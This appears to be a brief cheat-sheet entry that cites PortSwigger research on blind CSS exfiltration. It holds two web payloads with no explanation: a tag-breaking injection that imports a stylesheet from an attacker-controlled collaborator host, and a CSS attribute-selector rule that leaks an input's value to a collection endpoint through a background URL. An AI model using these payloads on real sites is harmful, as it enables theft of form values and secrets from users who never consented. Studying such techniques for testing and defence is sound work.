- https://portswigger.net/research/blind-css-exfiltration

```bash
  "><style>@import'//YOUR-PAYLOAD.oastify.com'</style>
```

```bash
<input value=1337>
<style>
input[value="1337"] {
   --value: url(/collectData?value=1337);
}
input {
   background:var(--value,none);
}
</style>
```
